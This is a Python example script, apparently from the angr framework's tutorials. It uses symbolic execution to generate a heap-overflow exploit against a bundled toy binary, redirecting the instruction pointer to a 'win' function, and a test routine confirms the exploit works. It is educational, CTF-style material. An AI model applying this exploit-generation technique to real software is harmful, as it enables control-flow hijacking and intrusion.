#!/usr/bin/env python

import os, os.path
import subprocess

DIR = os.path.dirname(os.path.realpath(__file__))

def main():
    # angr now has the ability to correctly execute through malloc. this is a big
    # achievement as malloc is a complicated function and shows off how much effort
    # has been placed into creating correct execution. In this example, we will use
    # angr to perform a basic heap overwrite and achieve control over rip.

    # The premise of this binary is to ask for two inputs, the second of which can
    # overflow into the area of the first. Further, a pointer will be dereferenced
    # in this process, thus giving us a target to control execution from.

    import angr, simuvex

    # By default, angr will use a sim procedure instead of going through malloc
    # This will tell angr to go ahead and use libc's calloc
    proj = angr.Project("./simple_heap_overflow", exclude_sim_procedures_list=["calloc"])

    # The extra option here is due to a feature not yet in angr for handling
    # underconstraining 0 initialization of certain memory allocations
    state = proj.factory.entry_state(add_options={simuvex.o.CGC_ZERO_FILL_UNCONSTRAINED_MEMORY})

    # We're looking for unconstrained paths, it means we may have control
    pg = proj.factory.path_group(state,save_unconstrained=True)

    # Step execution until we find a place we may control
    while pg.active != [] and pg.unconstrained == []:
        pg.step()

    # In [9]: pg
    # Out[9]: <PathGroup with 1 deadended, 1 unconstrained>

    # Make a copy of the state to play with
    s = pg.unconstrained[0].state.copy()

    # Now we can simply tell angr to set the instruction pointer to point at the
    # win function to give us execution
    s.add_constraints(s.regs.rip == proj.loader.main_bin.get_symbol('win').addr)

    assert s.satisfiable()

    # Call the solving engine and write the solution out to a file called "exploit"
    print "Writing exploit as \"exploit\""
    s.posix.dump(0,"exploit")

    # Now you can run the program and feed it your exploit to gain execution
    # ./simple_heap_overflow < exploit

def test():

    # Generate the exploit
    main()

    # Make sure it worked
    out = subprocess.check_output("{0} < {1}".format(
        os.path.join(DIR,"simple_heap_overflow"),
        os.path.join(DIR,"exploit"),
        )
        ,shell=True)

    # Assert we got to the printing of Win
    assert "Win" in out


if __name__ == '__main__':
    main()
